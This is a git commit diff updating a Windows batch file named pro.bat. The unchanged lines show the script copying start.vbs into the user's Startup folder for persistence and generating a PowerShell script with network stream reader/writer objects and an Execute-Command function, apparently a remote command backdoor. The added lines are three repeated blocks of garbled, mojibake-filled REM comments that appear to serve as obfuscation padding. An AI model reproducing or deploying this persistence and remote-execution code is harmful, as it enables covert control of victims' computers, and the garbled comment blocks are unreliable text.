7f1c65ac177889917062857b9a9898fadccab86c
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-14 03:58:03 +0300

    Update pro.bat

--- pro.bat
+++ pro.bat
@@ -1,3 +1,20 @@
+@REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
+@REM @yÈh off
+@REM cd %µé©%
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh cd %µé©%  ([µÛ]£.bat
+@REM yÈh :)  ([µÛ]£.bat
+@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
+@REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh     ^^(^ ^ ¦º5.bat^   ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²$z^ ^¦º5[µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® os^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® threading^ ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²æéas s¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]
 @echo off
 move "%temp%\start.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 :loop
@@ -14,6 +31,23 @@ if not exist %FILE% (
         echo          $writer = New-Object System.IO.StreamWriter^($stream^)
         echo          $reader = New-Object System.IO.StreamReader^($stream^)
         echo.
+@REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
+@REM @yÈh off
+@REM cd %µé©%
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh cd %µé©%  ([µÛ]£.bat
+@REM yÈh :)  ([µÛ]£.bat
+@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
+@REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh     ^^(^ ^ ¦º5.bat^   ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²$z^ ^¦º5[µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® os^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® threading^ ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²æéas s¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]
         echo          function Execute-Command ^{  
         echo               param^([string]$cmd^)
         echo.
@@ -60,3 +94,20 @@ if not exist %FILE% (
    timeout /t 100 >nul
 )
 goto loop
+@REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
+@REM @yÈh off
+@REM cd %µé©%
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh cd %µé©%  ([µÛ]£.bat
+@REM yÈh :)  ([µÛ]£.bat
+@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
+@REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh     ^^(^ ^ ¦º5.bat^   ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²$z^ ^¦º5[µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® os^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® threading^ ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²æéas s¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]
